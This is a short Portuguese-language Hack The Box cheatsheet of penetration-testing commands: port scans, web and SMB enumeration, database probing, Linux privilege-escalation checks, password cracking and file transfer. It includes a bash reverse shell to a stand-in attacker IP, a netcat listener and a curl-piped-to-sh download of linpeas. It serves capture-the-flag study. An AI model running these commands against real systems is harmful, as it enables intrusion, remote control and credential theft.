# 📋 Cheatsheet — HTB Referência Rápida

## Reconhecimento

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.XXX
nmap -T4 -p- 10.10.10.XXX
```

## Enumeração Web

```bash
gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
ffuf -w wordlist.txt -u http://DOMINIO -H "Host: FUZZ.DOMINIO"
```

## SMB / FTP

```bash
smbclient -L //IP
enum4linux -a IP
ftp IP  # anonymous:anonymous
```

## Bancos de Dados

```bash
mysql -h IP -u root -p
mongo --host IP; show dbs
redis-cli -h IP; keys *
```

## Escalada Linux

```bash
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
uname -a
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Reverse Shells

```bash
bash -i >& /dev/tcp/SEU_IP/4444 0>&1
nc -lvnp 4444

# Upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
```

## Transferência de Arquivos

```bash
python3 -m http.server 8080
wget http://SEU_IP:8080/arquivo
```

## Quebra de Senha

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
